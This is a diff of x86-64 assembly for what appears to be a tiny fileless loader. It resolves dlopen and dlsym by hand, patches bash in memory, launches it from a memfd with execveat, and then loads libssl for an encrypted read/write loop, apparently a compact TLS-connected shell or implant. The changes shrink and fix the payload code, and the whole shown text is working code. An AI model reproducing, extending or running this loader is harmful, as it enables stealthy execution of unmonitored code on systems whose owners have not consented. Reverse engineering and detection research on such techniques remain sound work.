@@ -90,19 +90,12 @@ BITS 64
 %define DLSY                0x79736c64
 
 
-; Macros, these two are used for the patch
+; Macros used for the patch
 %macro resolve_symbol 2
     lea rsi, [rel %2]
     mov rdi, %1
     call _dlsym
 %endmacro
-
-%macro dlopen 2
-    mov rsi, %2
-    lea rdi, [rel %1]
-    call _dlopen
-%endmacro
-
 
 ; THIS IS THE HEADER FROM
 ; https://www.muppetlabs.com/~breadbox/software/tiny/tiny-x64.asm.txt
@@ -214,23 +207,23 @@ _find_dynamic_loop:
 ; setup this loop
     add rbx, rsp
 _read_sht_dynamic:
-; d_tag
-    mov rsi, [rbx]
+; d_tag, only care about the lower bits
+    mov esi, [rbx]
 ; d_val
     mov rdi, [rbx + 8]
 
 ; Implementing a case statement here
-    cmp rsi, DT_STRTAB
+    cmp esi, DT_STRTAB
     jne _case_symtab_test
     mov r8, rdi
 
 _case_symtab_test:
-    cmp rsi, DT_SYMTAB
+    cmp esi, DT_SYMTAB
     jne _case_jmprel_test
     mov r9, rdi
 
 _case_jmprel_test:
-    cmp rsi, DT_JMPREL
+    cmp esi, DT_JMPREL
     jne _read_sht_dynamic_tail
     mov r10, rdi
 
@@ -304,7 +297,7 @@ _apply_patches:
     sub r14, r13
     mov [rdx + _dlopen_target - _patch_start], r14d
 
-    add r13, (_dlsym_end - _dlopen_end)
+    add r13, (_dlsym_end - _dlsym)
     sub r15, r13
     mov [rdx + _dlsym_target - _patch_start], r15d
 
@@ -331,9 +324,7 @@ _execve_memfd:
     mov eax, SYS_execveat
     syscall
 
-; end of the line
-
-; Now lets move onto the patch we are applying to bash!
+; we will now be in the patch after the execveat(), so lets move onto that!
 
 ; rsp - buffer - we are just trashing the stack
 ; r12 - loop counter
@@ -358,12 +349,18 @@ _dlsym_target:
 _dlsym_end:
 
 _patch_code:
-; just need to push one value, but we'll overwrite the stack that was allocated
-; before us.
+; just need to push one value to keep the stack aligned for the functions we
+; will be calling but we'll overwrite the stack that was allocated before us.
     push rbp
 
 ; load libssl RTLD_LAZY
-    dlopen _str_libssl, RTLD_LAZY
+    ; mov esi, RTLD_LAZY, as RTLD_LAZY is 1
+    ; this saves 1 byte compared to that. (5 vs 4)
+    xor esi, esi
+    inc esi
+
+    lea rdi, [rel _str_libssl]
+    call _dlopen
     mov r14, rax
 
 ; lets get some symbols, and setup the libssl context
@@ -415,7 +412,6 @@ read_twice:
 
     mov al, SYS_write
     mov edi, eax
-    ; mov edi, eax
     syscall
 
 _inf:
